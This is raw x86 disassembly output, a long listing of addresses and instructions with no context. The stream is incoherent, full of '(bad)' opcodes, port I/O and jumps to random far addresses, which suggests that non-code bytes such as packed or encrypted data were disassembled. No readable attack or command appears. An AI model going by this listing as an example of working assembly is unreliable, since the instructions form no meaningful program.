  420e4e:	mov    ecx,0xebbafdc6
  420e53:	std    
  420e54:	cmc    
  420e55:	out    0xdb,eax
  420e57:	in     eax,0xd6
  420e59:	(bad)  
  420e5a:	fcomip st,st(5)
  420e5c:	add    ecx,DWORD PTR [edi]
  420e5e:	(bad)  
  420e5f:	fmulp  st(3),st
  420e61:	cli    
  420e62:	ffree  st(0)
  420e64:	mov    ecx,0xcbf1add0
  420e69:	mov    ch,0xfa
  420e6b:	mov    ebx,0xeeefb9cf
  420e70:	(bad)  
  420e72:	enter  0xd8fa,0xed
  420e76:	loopne 0x420e4d
  420e78:	sti    
  420e79:	jmp    0x420e7d
  420e7b:	loop   0x420e74
  420e7d:	or     esi,esi
  420e7f:	add    ebp,esi
  420e81:	int    0xf9
  420e83:	add    esp,ebp
  420e85:	int    0xaf
  420e87:	call   0xc80fe579
  420e8c:	(bad)  
  420e8e:	icebp  
  420e8f:	icebp  
  420e90:	fcomi  st,st(7)
  420e92:	cld    
  420e93:	(bad)  
  420e95:	rcr    bh,cl
  420e97:	jecxz  0x420e86
  420e99:	repz pop es
  420e9b:	hlt    
  420e9c:	fild   WORD PTR ds:0xfb07e0cf
  420ea2:	add    edx,esi
  420ea4:	lock test eax,0xd7ecbdeb
  420eaa:	loope  0x420e63
  420eac:	scas   eax,DWORD PTR es:[edi]
  420ead:	mov    ah,0xf6
  420eaf:	(bad)  
  420eb0:	cmc    
  420eb1:	in     eax,dx
  420eb2:	fsub   st(4),st
  420eb4:	in     al,dx
  420eb5:	loopne 0x420e91
  420eb7:	fsub   st,st(4)
  420eb9:	fcmovnu st,st(1)
  420ebb:	cld    
  420ebc:	ret    
  420ebd:	loop   0x420ea0
  420ebf:	in     eax,0xe
  420ec1:	int3   
  420ec2:	loope  0x420ea1
  420ec4:	in     eax,0xe8
  420ec6:	repnz into 
  420ec8:	hlt    
  420ec9:	icebp  
  420eca:	sti    
  420ecb:	(bad)  [ebp-0x1b49004f]
  420ed1:	mov    ecx,0xf2f9bfb4
  420ed6:	out    0xd8,eax
  420ed8:	loop   0x420ec1
  420eda:	repnz or DWORD PTR [edi-0x36013540],edi
  420ee1:	fld    DWORD PTR [esi]
  420ee3:	jmp    0x420eb7
  420ee5:	jmp    0x420eae
  420ee7:	mov    cl,0xf3
  420ee9:	enter  0xcfd7,0xeb
  420eed:	(bad)
  420ef0:	fdiv   QWORD PTR [ebp-0x1f1d2f0e]
  420ef6:	repnz in eax,0xbe
  420ef9:	lock rcl al,cl
  420efc:	icebp  
  420efd:	add    esi,edi
  420eff:	mov    esp,0xf3e6ffeb
  420f04:	mov    eax,0xbceae3be
  420f09:	xlat   BYTE PTR ds:[ebx]
  420f0a:	jmp    0x420ed5
  420f0c:	shr    esp,1
  420f0e:	shr    DWORD PTR [esi+edx*8-0x2000442c],1
  420f15:	cli    
  420f16:	stc    
  420f17:	mov    DWORD PTR [eax],0xfc07c3f9
  420f1d:	test   BYTE PTR [eax],0xdb
  420f20:	push   cs
  420f21:	or     BYTE PTR [edx],al
  420f23:	repz iret 
  420f25:	out    0xad,eax
  420f27:	mov    bh,0xad
  420f29:	repnz cli 
  420f2b:	lock sti 
  420f2d:	out    0xff,al
  420f2f:	shl    esi,cl
  420f31:	mov    ebp,0xd1ced602
  420f36:	int    0xc6
  420f38:	mov    ebp,0x7f4f3d5
  420f3d:	call   0xc644e53c
  420f42:	std    
  420f43:	or     bl,ch
  420f45:	scas   al,BYTE PTR es:[edi]
  420f46:	in     eax,0xed
  420f48:	mov    ebp,0xf5d1e1ce
  420f4d:	aam    0xd4
  420f4f:	enter  0xe3d6,0xf7
  420f53:	sar    edi,cl
  420f55:	mov    esp,0xc200ddef
  420f5a:	in     al,0xe9
  420f5c:	cli    
  420f5d:	in     eax,0xe8
  420f5f:	retf   0xd4e2
  420f62:	into   
  420f63:	stc    
  420f64:	fldcw  WORD PTR [esi-0x511a3d31]
  420f6a:	in     eax,0xd3
  420f6c:	(bad)  
  420f6d:	(bad)
  420f70:	clc    
  420f71:	lock mov edx,0x7e8d3d8
  420f77:	sar    DWORD PTR [ebp-0x3b290c3f],0xd5
  420f7e:	std    
  420f7f:	or     edi,esi
  420f81:	or     ah,al
  420f83:	loop   0x420f5d
  420f85:	repz icebp 
  420f87:	enter  0xf2ac,0xe8
  420f8b:	loop   0x420f4d
  420f8d:	out    0xf8,al
  420f8f:	clc    
  420f90:	into   
  420f91:	retf   
  420f92:	stc    
  420f93:	mov    ebp,0xdef4bcdf
  420f98:	loopne 0x420f6f
  420f9a:	(bad)
  420f9d:	mov    esi,0xf8f8e601
  420fa2:	push   es
  420fa3:	adc    ch,BYTE PTR [edx-0x321e131a]
  420fa9:	fsubr  QWORD PTR [ebp-0x3b1f3b14]
  420faf:	in     al,0xf9
  420fb1:	(bad)  
  420fb3:	mov    ecx,0x5dbc0cd
  420fb8:	mov    edi,0x8c2c3f4
  420fbd:	(bad)  
  420fbe:	push   cs
  420fbf:	(bad)  
  420fc0:	(bad)  
  420fc1:	(bad)  
  420fc3:	jecxz  0x420f95
  420fc5:	leave  
  420fc6:	out    0xac,al
  420fc8:	mov    dl,0xcf
  420fca:	test   eax,0xe5e6d9cc
  420fcf:	rcr    esp,cl
  420fd1:	retf   0xe3c9
  420fd4:	(bad)  
  420fd5:	mov    edx,0xc300c7ed
  420fda:	fdiv   st,st(7)
  420fdc:	out    0xe6,eax
  420fde:	add    al,0xef
  420fe0:	cmc    
  420fe1:	iret   
  420fe2:	rol    esp,0xc5
  420fe5:	jmp    0xecc4:0xb5d0c6e9
  420fec:	mov    edx,0xbfd4f2ee
  420ff1:	(bad)  
  420ff2:	aam    0xec
  420ff4:	ret    
  420ff5:	add    dh,ah
  420ff7:	shl    esp,1
  420ff9:	fdivp  st(3),st
  420ffb:	in     al,0xfe
  420ffd:	or     bh,ch
  420fff:	pop    es
  421000:	push   cs
  421001:	push   es
  421002:	rol    DWORD PTR [eax],0xbc
  421005:	loope  0x420fea
  421007:	into   
  421008:	loope  0x421001
  42100a:	out    dx,al
  42100b:	ror    cl,1
  42100d:	stc    
  42100e:	(bad)  
  42100f:	in     eax,dx
  421010:	jmp    0x421001
  421012:	in     al,dx
  421013:	xlat   BYTE PTR ds:[ebx]
  421014:	std    
  421015:	fcmovbe st,st(0)
  421017:	(bad)  
  421018:	out    0x6,al
  42101a:	div    dh
  42101c:	lock or eax,eax
  42101f:	fcmovu st,st(1)
  421021:	cld    
  421022:	int    0xf3
  421024:	(bad)  
  421026:	shr    ecx,cl
  421028:	aam    0xc2
  42102a:	mov    ebx,0xe6e8b3e6
  42102f:	(bad)
  421032:	rcl    ah,cl
  421034:	hlt    
  421035:	(bad)  
  421037:	out    0xff,eax
  421039:	in     al,dx
  42103a:	out    0xfc,eax
  42103c:	test   eax,0x5fa00ee
  421042:	or     cl,bl
  421044:	ret    0xd2d2
  421047:	(bad)  
  421048:	rol    ecx,cl
  42104a:	int3   
  42104b:	in     al,dx
  42104c:	fcmovnu st,st(0)
  42104e:	stc    
  42104f:	jmp    0x421027
  421051:	clc    
  421052:	jmp    0xdae5:0xcceddfcc
  421059:	(bad)  
  42105b:	cli    
  42105c:	(bad)  
  42105d:	aad    0xde
  42105f:	aam    0xde
  421061:	aam    0xf
  421063:	call   0xe923ed59
  421068:	(bad)
  42106b:	shl    eax,1
  42106d:	(bad)  
  42106e:	lock mov edx,0xb8ffd6f6
  421074:	ret    
  421075:	in     eax,dx
  421076:	out    dx,eax
  421077:	sti    
  421078:	ret    0x7df
  42107b:	(bad)  
  42107c:	jmp    0xf3e8:0xdeff4de
  421083:	call   0xe12ee866
  421088:	int3   
  421089:	out    0xeb,eax
  42108b:	in     al,dx
  42108c:	in     eax,dx
  42108d:	scas   al,BYTE PTR es:[edi]
  42108e:	mov    ah,0xe4
  421090:	cli    
  421091:	mov    dl,0xf9
  421093:	ret    0xd7d0
  421096:	mov    ecx,0xf7d7c1
  42109b:	pop    es
  42109c:	shl    bh,0xfa
  42109f:	out    dx,eax
  4210a0:	loop   0x42108c
  4210a2:	sti    
  4210a3:	in     eax,0xc2
  4210a5:	out    dx,al
  4210a6:	retf   0xedbe
  4210a9:	hlt    
  4210aa:	jmp    0x4210a1
  4210ac:	int    0xe5
  4210ae:	shl    cl,1
  4210b0:	cli    
  4210b1:	hlt    
  4210b2:	in     eax,dx
  4210b3:	xlat   BYTE PTR ds:[ebx]
  4210b4:	cli    
  4210b5:	loope  0x4210ac
  4210b7:	push   es
  4210b8:	add    dl,dh
  4210ba:	jmp    0xdada:0xdcfcc9bc
  4210c1:	(bad)  
  4210c2:	loopne 0x4210bc
  4210c4:	shr    dh,cl
  4210c6:	scas   eax,DWORD PTR es:[edi]
  4210c7:	(bad)
  4210ca:	shl    DWORD PTR [esi-0x729002c],0xcc
  4210d1:	std    
  4210d2:	aam    0xb0
  4210d4:	out    dx,eax
  4210d5:	iret   
  4210d6:	iret   
  4210d7:	in     eax,0xff
  4210d9:	shl    cl,1
  4210db:	jecxz  0x4210a1
  4210dd:	push   es
  4210de:	cmc    
  4210df:	(bad)  
  4210e0:	aam    0x13
  4210e2:	in     al,0xc4
  4210e4:	(bad)  
  4210e5:	jmp    0x4210d7
  4210e7:	lock (bad) 
  4210e9:	lds    esi,FWORD PTR [esp+eax*8-0x7261a47]
  4210f0:	cmc    
  4210f1:	int    0xce
  4210f3:	mov    al,0xf2
  4210f5:	mov    eax,0x5fdb4de
  4210fa:	cli    
  4210fb:	sti    
  4210fc:	pop    es
  4210fd:	std    
  4210fe:	xlat   BYTE PTR ds:[ebx]
  4210ff:	iret   
  421100:	aad    0xe8
  421102:	or     BYTE PTR ds:0xc3c6dfd8,al
  421108:	repnz mov bh,0xb4
  42110b:	aad    0xce
  42110d:	in     al,0xf2
  42110f:	fcmovu st,st(5)
  421111:	(bad)  
  421112:	push   DWORD PTR [eax-0x2c013f05]
  421118:	ret    0xc1f3
  42111b:	cld    
  42111c:	jmp    0x421123
  42111e:	retf   
  42111f:	les    ecx,FWORD PTR [esi]
  421121:	cli    
  421122:	fmul   DWORD PTR [eax]
  421124:	repnz shl eax,1
  421127:	scas   eax,DWORD PTR es:[edi]
  421128:	jmp    0x4210fc
  42112a:	cli    
  42112b:	leave  
  42112c:	(bad)  
  42112f:	mov    edi,0xcdd3eff7
  421134:	(bad)  
  421135:	xlat   BYTE PTR ds:[ebx]
  421136:	std    
  421137:	aad    0xd6
  421139:	or     eax,DWORD PTR [esi]
  42113b:	cli    
  42113c:	(bad)  
  42113d:	fimul  WORD PTR [ecx]
  42113f:	in     eax,0x5
  421141:	in     eax,dx
  421142:	in     eax,0xcb
  421144:	in     al,0xf7
  421146:	in     al,0xf3
  421148:	out    dx,al
  421149:	aam    0xe9
  42114b:	mov    edx,0xecccb9f1
  421150:	push   esi
  421152:	clc    
  421153:	(bad)  
  421155:	ret    0xedfc
  421158:	add    eax,eax
  42115a:	fld    st(3)
  42115c:	shl    al,1
  42115e:	out    0xcb,al
  421160:	cli    
  421161:	or     al,0xfa
  421163:	out    0xb9,eax
  421165:	fadd   st(6),st
  421167:	out    0xb0,al
  421169:	loope  0x42113d
  42116b:	xlat   BYTE PTR ds:[ebx]
  42116c:	repnz enter 0xcccd,0xcf
  421171:	cld    
  421172:	rol    BYTE PTR [ebx],cl
  421174:	out    dx,al
  421175:	rcl    al,1
  421177:	into   
  421178:	loopne 0x42115a
  42117a:	mov    ecx,0xc4c8fefe
  42117f:	sti    
  421180:	in     al,dx
  421181:	enter  0xf8e1,0xd8
  421185:	rcl    bl,0xd2
  421188:	rcl    dl,0xb1
  42118b:	stc    
  42118c:	mov    ch,0xef
  42118e:	repz fdivrp st(6),st
  421191:	retf   0xbace
  421194:	int3   
  421195:	xlat   BYTE PTR ds:[ebx]
  421196:	into   
  421197:	mov    eax,0xfcd407c5
  42119c:	clc    
  42119d:	or     ah,cl
  42119f:	add    esp,edi
  4211a1:	call   0xd8f51590
  4211a6:	fsubr  st(6),st
  4211a8:	icebp  
  4211a9:	iret   
  4211aa:	loope  0x421185
  4211ac:	mov    dh,0xc9
  4211ae:	(bad)  
  4211af:	mov    eax,0xeef8d6de
  4211b4:	aam    0xe1
  4211b6:	fld    st(1)
  4211b8:	lock (bad) 
  4211ba:	loop   0x421181
  4211bc:	cli    
  4211bd:	xlat   BYTE PTR ds:[ebx]
  4211be:	lds    ecx,FWORD PTR [ecx]
  4211c0:	mov    BYTE PTR [edi],0xe9
  4211c3:	out    0xcb,eax
  4211c5:	mov    al,0xd3
  4211c7:	ret    0xdcca
  4211ca:	mov    dl,0xe1
  4211cc:	mov    ch,0xb8
  4211ce:	fcmovnbe st,st(1)
  4211d0:	aad    0xd0
  4211d2:	aad    0xf1
  4211d4:	fdiv   st,st(7)
  4211d6:	ret    
  4211d7:	push   es
  4211d8:	add    eax,0xbfd2d704
  4211dd:	xadd   BYTE PTR [edi],cl
  4211e0:	pop    es
  4211e1:	fucomip st,st(1)
  4211e3:	add    al,0xad
  4211e5:	ret    0xb0be
  4211e8:	mov    cl,0xae
  4211ea:	loopne 0x4211e6
  4211ec:	int3   
  4211ed:	in     al,dx
  4211ee:	in     al,dx
  4211ef:	cli    
  4211f0:	ror    ch,cl
  4211f2:	aam    0xc8
  4211f4:	stc    
  4211f5:	in     eax,dx
  4211f6:	iret   
  4211f7:	loop   0x4211f4
  4211f9:	mov    edx,0xf8d6cad7
  4211fe:	fdivr  DWORD PTR [esp+eax*8-0x34060505]
  421205:	jmp    0xe209d4f1
  42120a:	(bad)  
  42120b:	hlt    
  42120c:	clc    
  42120d:	iret   
  42120e:	cli    
  42120f:	mov    al,0xca
  421211:	stc    
  421212:	lock std 
  421214:	mov    edi,0xc5d4ffda
  421219:	add    al,0xff
  42121b:	(bad)  
  42121d:	hlt    
  42121e:	hlt    
  42121f:	fcmovnu st,st(6)
  421221:	sti    
  421222:	or     eax,DWORD PTR [edi]
  421224:	ror    ah,cl
  421226:	vpaddq ymm3,ymm5,ymm4
  42122a:	mov    bl,0xcb
  42122c:	rcr    ebx,0xf1
  42122f:	(bad)  
  421230:	sar    esi,1
  421232:	fmul   st(2),st
  421234:	loope  0x421216
  421236:	out    0xe7,al
  421238:	xlat   BYTE PTR ds:[ebx]
  421239:	mov    esi,0xc9c109e4
  42123e:	loope  0x421214
  421240:	add    eax,ebp
  421242:	ror    DWORD PTR [edx],cl
  421244:	jecxz  0x4211f7
  421246:	out    0xbc,al
  421248:	mul    bh
  42124a:	loop   0x421225
  42124c:	mov    dl,0xce
  42124e:	hlt    
  42124f:	int    0xce
  421251:	fprem  
  421253:	ret    
  421254:	rcr    ebp,cl
  421256:	sti    
  421257:	mov    eax,0xf9fc04fc
  42125c:	call   ebp
  42125e:	hlt    
  42125f:	out    0xf5,eax
  421261:	loopne 0x42126a
  421263:	retf   0xd3c7
  421266:	out    0xbe,eax
  421268:	mov    esp,0xf0e6b3cf
  42126d:	cmc    
  42126e:	out    dx,eax
  42126f:	imul   edx
  421271:	add    ebx,esi
  421273:	xlat   BYTE PTR ds:[ebx]
  421274:	int    0xce
  421276:	mov    esp,0xc60407f8
  42127b:	in     al,0xeb
  42127d:	in     al,0xe2
  42127f:	les    eax,FWORD PTR [eax]
  421281:	add    al,cl
  421283:	ud1    ebp,DWORD PTR [edi-0x324e3a34]
  42128a:	loop   0x421279
  42128c:	out    dx,eax
  42128d:	cmc    
  42128e:	enter  0xbdca,0xf5
  421292:	fnstsw WORD PTR [ebp-0x1f0d0a03]
  421298:	clc    
  421299:	rol    ch,1
  42129b:	clc    
  42129c:	add    al,0xda
  42129e:	hlt    
  42129f:	cld    
  4212a0:	aam    0xc5
  4212a2:	fsubrp st(7),st
  4212a4:	(bad)  
  4212a5:	in     eax,0xe8
  4212a7:	mov    bl,0xf2
  4212a9:	jmp    0x42127f
  4212ab:	retf   
  4212ac:	repz div eax
  4212af:	in     eax,dx
  4212b0:	mov    esi,0xceb4c8de
  4212b5:	(bad)  
  4212b7:	xlat   BYTE PTR ds:[ebx]
  4212b8:	ret    
  4212b9:	pop    es
  4212ba:	loopne 0x421282
  4212bc:	add    eax,0xde3e1fa
  4212c1:	enter  0xe7e6,0xc5
  4212c5:	in     eax,0xce
  4212c7:	repnz (bad) 
  4212c9:	xlat   BYTE PTR ds:[ebx]
  4212ca:	hlt    
  4212cb:	rcl    ch,cl
  4212cd:	fmul   st,st(7)
  4212cf:	xlat   BYTE PTR ds:[ebx]
  4212d0:	mov    dh,0xfb
  4212d2:	jmp    0xee3014c5
  4212d7:	mov    eax,0xffe1ebfb
  4212dc:	jecxz  0x4212de
  4212de:	enter  0xf50a,0xe6
  4212e2:	enter  0xe107,0xdf
  4212e6:	jecxz  0x4212b9
  4212e8:	retf   0xfbe2
  4212eb:	shl    ecx,0xb0
  4212ee:	mov    al,0xe4
  4212f0:	mov    ebx,0xe1e8bcea
  4212f5:	into   
  4212f6:	(bad)  
  4212f7:	into   
  4212f8:	shl    dl,1
  4212fa:	(bad)  
  4212fc:	dec    ecx
  4212fe:	push   es
  4212ff:	(bad)
  421302:	sar    ecx,0xe3
  421305:	shl    ebx,cl
  421307:	out    0xd4,eax
  421309:	jecxz  0x4212fb
  42130b:	lods   al,BYTE PTR ds:[esi]
  42130c:	mul    esp
  42130e:	clc    
  42130f:	xlat   BYTE PTR ds:[ebx]
  421310:	shl    ebx,1
  421312:	mov    eax,0xe3def2e3
  421317:	rcr    esi,1
  421319:	rol    dh,0x7
  42131c:	test   DWORD PTR [ebx],0x2ddd6d7
  421322:	jecxz  0x421300
  421324:	repnz fsubr DWORD PTR [esp+ecx*8-0x534c380b]
  42132c:	mov    cl,0xec
  42132e:	jmp    0xe0ca:0xd2f8d3ce
  421335:	in     al,dx
  421336:	(bad)  
  421337:	rcr    ch,1
  421339:	int3   
  42133a:	inc    al
  42133c:	retf   0xe3e4
  42133f:	fld1   
  421341:	push   cs
  421342:	(bad)  
  421343:	loopne 0x4212f6
  421345:	out    dx,al
  421346:	lods   eax,DWORD PTR ds:[esi]
  421347:	aad    0xdc
  421349:	jmp    0x421301
  42134b:	int3   
  42134c:	out    dx,al
  42134d:	mov    ecx,0xf0fdebf9
  421352:	(bad)  
  421353:	into   
  421354:	fadd   QWORD PTR [ecx]
  421356:	repz jecxz 0x421320
  421359:	lock fxch st(3)
  42135c:	std    
  42135d:	jmp    0xf9e4:0xe8fefbd6
  421364:	loop   0x421332
  421366:	call   0xc2ff003a
  42136b:	(bad)  
  42136c:	neg    ebx
  42136e:	lock mov esi,0xb9e2d8fa
  421374:	repnz cmc 
  421376:	shl    DWORD PTR [edx+ebx*8-0x2bfb2c01],cl
  42137d:	(bad)  
  42137f:	retf   
  421380:	fcmove st,st(3)
  421382:	pop    es
  421383:	leave  
  421384:	out    0xb3,eax
  421386:	mov    ch,0xe4
  421389:	shr    DWORD PTR [esp+esi*8-0x1b31472b],1
  421390:	(bad)  
  421391:	in     eax,dx
  421392:	int3   
  421393:	retf   0xb6cf
  421396:	call   edx
  421398:	hlt    
  421399:	fadd   QWORD PTR [ecx]
  42139b:	retf   
  42139c:	loop   0x42137a
  42139e:	in     eax,0xc0
  4213a0:	cmc    
  4213a1:	sti    
  4213a2:	retf   
  4213a3:	or     DWORD PTR [ebp-0x4c183c4d],ebp
  4213a9:	jecxz  0x42135e
  4213ab:	ret    0xb6ca
  4213ae:	mov    cl,0xb6
  4213b0:	mov    edi,0xc8f6c9d6
  4213b5:	repnz (bad) 
  4213b8:	aad    0xdc
  4213ba:	jmp    0x421397
  4213bc:	lds    ecx,FWORD PTR [ecx]
  4213be:	call   0xb510ec3
  4213c3:	adc    al,al
  4213c5:	in     al,dx
  4213c6:	mov    ebp,0xebdbf7c1
  4213cb:	shr    bh,cl
  4213cd:	rcr    bl,cl
  4213cf:	xlat   BYTE PTR ds:[ebx]
  4213d0:	in     eax,dx
  4213d1:	retf   
  4213d2:	fstp   st(1)
  4213d4:	idiv   ch
  4213d6:	add    bl,bl
  4213d8:	jecxz  0x42139c
  4213da:	jmp    0x4213d4
  4213dc:	ret    0xf904
  4213df:	or     DWORD PTR [ebx],eax
  4213e1:	pop    es
  4213e2:	repnz pop es
  4213e4:	jmp    0x4213a9
  4213e6:	call   0xec2bf9a8
  4213eb:	in     eax,0xf0
  4213ed:	jmp    0x4213cd
  4213ef:	mov    bh,0xd4
  4213f1:	fstp   TBYTE PTR [edx-0x13fe3d1f]
  4213f7:	ret    
  4213f8:	pop    es
  4213f9:	ret    0xc7c2
  4213fc:	push   es
  4213fd:	aam    0xe4
  4213ff:	pop    es
  421400:	(bad)  
  421402:	lds    ecx,FWORD PTR [ebx]
  421404:	in     eax,0xed
  421406:	int3   
  421407:	mul    ah
  421409:	in     al,0xc2
  42140b:	loope  0x4213e2
  42140d:	(bad)  
  42140f:	(bad)  
  421410:	jmp    0xf3ec:0xf7efe2bc
  421417:	cmc    
  421418:	add    ecx,esp
  42141a:	cld    
  42141b:	add    al,0xf0
  42141d:	cld    
  42141e:	(bad)  
  42141f:	fsub   st,st(2)
  421421:	cld    
  421422:	leave  
  421423:	std    
  421424:	icebp  
  421425:	mov    ebp,0xe1eccadd
  42142a:	sar    ecx,1
  42142c:	fmul   st,st(4)
  42142e:	jmp    0xe3d1:0xfdf0b5c5
  421435:	int    0xd5
  421437:	mov    ebp,0xe1f5d7f0
  42143c:	sti    
  42143d:	retf   0xc6f7
  421440:	in     al,0xec
  421442:	or     ah,bl
  421444:	rol    dh,0xae
  421447:	mov    esp,0xcac8e2ae
  42144c:	out    dx,al
  42144d:	mov    al,0xd2
  42144f:	enter  0x3c8,0xda
  421453:	shl    al,1
  421455:	aam    0xdc
  421457:	(bad)  
  421458:	mov    edi,0xffc50be7
  42145d:	or     dh,ah
  42145f:	into   
  421460:	clc    
  421461:	iret   
  421462:	int    0xe7
  421464:	mov    ebp,0xb6ece7ed
  421469:	in     eax,0xf5
  42146b:	loop   0x421436
  42146d:	(bad)  
  42146e:	jmp    0xf3b0:0xd003b5ff
  421475:	int3   
  421476:	loope  0x421436
  421478:	(bad)  
  42147a:	ret    0xe5c4
  42147d:	cli    
  42147e:	or     edi,esp
  421480:	fsubp  st(4),st
  421482:	enter  0xe8e0,0xb1
  421486:	lock test al,0xc6
  421489:	fcmovnbe st,st(4)
  42148b:	jmp    0xd6d9:0xb0cec8bb
  421492:	mov    ah,0x1
  421494:	loope  0x421453
  421496:	(bad)  
  421498:	jecxz  0x42145d
  42149a:	jecxz  0x421486
  42149c:	jmp    0x14618a1
  4214a1:	fisttp DWORD PTR [ecx]
  4214a3:	pop    es
  4214a4:	ffree  st(0)
  4214a6:	retf   
  4214a7:	call   0xd42e087d
  4214ac:	out    0xec,al
  4214ae:	mov    ecx,0xbebdc4ec
  4214b3:	out    dx,al
  4214b4:	mov    eax,0xbfce06f2
  4214b9:	inc    esp
  4214bb:	jmp    0xfce7:0xf9e3cbe1
  4214c2:	in     eax,0xde
  4214c4:	lds    ebp,FWORD PTR [edi-0x13513a2f]
  4214ca:	retf   
  4214cb:	icebp  
  4214cc:	rcl    al,1
  4214ce:	retf   0xe5c6
  4214d1:	jecxz  0x4214d1
  4214d3:	mov    esp,0xf7fcdee3
  4214d8:	add    eax,0x5c0bce4
  4214dd:	retf   
  4214de:	out    0x7,eax
  4214e0:	int    0x7
  4214e2:	bswap  ebp
  4214e4:	mov    ebp,0xc6abb3e1
  4214ea:	in     eax,dx
  4214eb:	aam    0xf9
  4214ed:	enter  0xc9e8,0xf6
  4214f1:	(bad)  
  4214f3:	div    ebp
  4214f5:	dec    bh
  4214f7:	cld    
  4214f8:	mov    esi,0x3f2c0e2
  4214fd:	(bad)  
  4214ff:	jmp    0xa9c6:0xeec5cfe5
  421506:	fidiv  WORD PTR [edx-0x1f441940]
  42150c:	in     eax,0xda
  42150e:	mov    ecx,0xd0f4cfd0
  421513:	jmp    0x31aebe6
  421518:	cmc    
  421519:	add    ebp,eax
  42151b:	add    cl,cl
  42151d:	add    edi,esp
  42151f:	in     al,0xf8
  421521:	bswap  eax
  421523:	pop    es
  421524:	(bad)  
  421525:	(bad)  
  421526:	in     al,dx
  421527:	shr    ecx,1
  421529:	mul    ecx
  42152b:	retf   
  42152c:	shl    DWORD PTR [esi-0x2b0b4137],cl
  421532:	cmc    
  421533:	cli    
  421534:	repnz (bad) 
  421536:	repnz mov eax,0xddd7e7f5
  42153c:	xlat   BYTE PTR ds:[ebx]
  42153d:	out    0xc5,eax
  42153f:	fadd   QWORD PTR [eax]
  421541:	jmp    0x421512
  421543:	call   0xa510d437
  421548:	(bad)
  42154b:	lods   al,BYTE PTR ds:[esi]
  42154c:	int    0xd8
  42154e:	stc    
  42154f:	mov    ecx,0x1fbdccb
  421554:	repnz rol DWORD PTR [ecx],1
  421557:	(bad)  
  421559:	loop   0x421554
  42155b:	jmp    0xc1211849
  421560:	out    0x0,eax
  421562:	out    dx,al
  421563:	or     DWORD PTR [esi-0x2b521e29],ebp
  421569:	out    dx,al
  42156a:	lods   al,BYTE PTR ds:[esi]
  42156b:	jmp    0xd53a0124
  421570:	mov    dh,0xea
  421572:	retf   0xe8e1
  421575:	push   ecx
  421577:	in     eax,dx
  421578:	add    bl,dl
  42157a:	cmc    
  42157b:	sti    
  42157c:	(bad)  
  42157d:	in     eax,0xdf
  42157f:	push   es
  421580:	int    0xe2
  421582:	fsubrp st(4),st
  421584:	ret    0xadcd
  421587:	fdivr  st(5),st
  421589:	lods   eax,DWORD PTR ds:[esi]
  42158a:	aam    0xb3
  42158c:	(bad)  
  42158d:	retf   
  42158e:	xlat   BYTE PTR ds:[ebx]
  42158f:	clc    
  421590:	ror    bh,cl
  421592:	fucomip st,st(6)
  421594:	shr    al,cl
  421596:	add    bh,BYTE PTR [esi-0x4092d23]
  42159c:	mov    DWORD PTR ds:0xe3e9e5dd,0xc0b8f3e8
  4215a6:	mov    edi,0xb4cdbce2
  4215ab:	int    0xf0
  4215ad:	cli    
  4215ae:	aam    0xcf
  4215b0:	mov    bl,0xb4
  4215b2:	mov    eax,0x2f5d3dd
  4215b7:	cli    
  4215b8:	add    al,BYTE PTR [esi+eax*8]
  4215bb:	(bad)
  4215be:	sti    
  4215bf:	sti    
  4215c0:	add    eax,0xc5dcc5e1
  4215c5:	in     al,dx
  4215c6:	call   0xeef3dc81
  4215cb:	vpand  xmm6,xmm1,xmm7
  4215cf:	jmp    0x4215c3
  4215d1:	(bad)  
  4215d2:	(bad)  
  4215d4:	(bad)  
  4215d6:	ret    0xddf8
  4215d9:	cli    
  4215da:	(bad)
  4215dd:	clc    
  4215de:	std    
  4215df:	out    0xd8,al
  4215e1:	in     eax,0xfa
  4215e3:	or     ch,BYTE PTR [edx-0x2a153730]
  4215e9:	hlt    
  4215ea:	aad    0xb6
  4215ec:	mov    ebx,0xe9c8eae7
  4215f1:	mov    ebx,0xfcfbeef2
  4215f6:	neg    ecx
  4215f8:	loope  0x4215f3
  4215fa:	aad    0xda
  4215fc:	fucom  st(2)
  4215fe:	jmp    0xd813:0xcc0504d8
  421605:	vpaddsw ymm1,ymm4,ymm0
  421609:	out    0xc3,eax
  42160b:	mov    bl,0xc4
  42160d:	fidivr DWORD PTR [eax+0x3eafabe]
  421613:	add    ecx,ebp
  421615:	lock imul ebp
  421618:	add    BYTE PTR [edx+0xc0debc],bh
  42161e:	pop    es
  42161f:	jecxz  0x42161b
  421621:	int    0xec
  421623:	(bad)  
  421624:	out    dx,al
  421625:	test   al,0xbc
  421627:	repz repz out 0xd0,al
  42162b:	test   eax,0xdee9b4f6
  421631:	clc    
  421632:	mov    cl,0xea
  421634:	ffreep st(0)
  421636:	pop    es
  421637:	in     al,dx
  421638:	(bad)  
  42163a:	or     edx,ecx
  42163c:	(bad)  
  42163d:	or     BYTE PTR [edx],al
  42163f:	out    dx,eax
  421640:	aad    0xc2
  421642:	dec    esi
  421644:	into   
  421645:	int    0xf0
  421647:	aad    0xe8
  421649:	out    dx,eax
  42164a:	mov    ah,0xc8
  42164c:	leave  
  42164d:	in     al,0xfb
  42164f:	into   
  421650:	fld    DWORD PTR [ebx]
  421652:	iret   
  421653:	ret    
  421654:	stc    
  421655:	add    edi,ecx
  421657:	mov    ah,0xc0
  421659:	out    0x2,eax
  42165b:	jmp    0x42165f
  42165d:	leave  
  42165e:	(bad)  
  42165f:	dec    DWORD PTR [esi]
  421661:	or     eax,0xd8ddd8df
  421666:	ret    
  421667:	in     al,dx
  421668:	mov    bh,0xd3
  42166a:	cli    
  42166b:	mov    ah,0xec
  42166d:	scas   al,BYTE PTR es:[edi]
  42166e:	int    0xcf
  421670:	lock fidivr WORD PTR [ecx-0x3e110310]
  421677:	mov    ebp,0xfbf5d2cc
  42167c:	fdiv   st,st(0)
  42167e:	idiv   dl
  421680:	loope  0x421675
  421682:	pop    es
  421683:	repnz out dx,eax
  421685:	mov    esi,0xd2b6c8e0
  42168a:	lock out 0xe4,al
  42168d:	cli    
  42168e:	imul   ah
  421690:	leave  
  421691:	repnz repnz std 
  421694:	fnstcw WORD PTR [ecx-0x222a3e34]
  42169a:	(bad)  
  42169c:	shl    edi,0xd9
  42169f:	(bad)  
  4216a0:	cli    
  4216a1:	mov    BYTE PTR [edx],0x1
  4216a4:	(bad)  
  4216a5:	xlat   BYTE PTR ds:[ebx]
  4216a6:	sar    BYTE PTR [esi-0x12393f2c],cl
  4216ac:	out    0xca,eax
  4216ae:	mul    esi
  4216b0:	out    dx,eax
  4216b1:	fdivr  DWORD PTR [eax-0xe33fe4c]
  4216b7:	int    0x2
  4216b9:	shl    ebp,1
  4216bb:	jmp    0x1de:0xe7d8eaea
  4216c2:	dec    ebp
  4216c4:	test   al,0xc2
  4216c6:	xlat   BYTE PTR ds:[ebx]
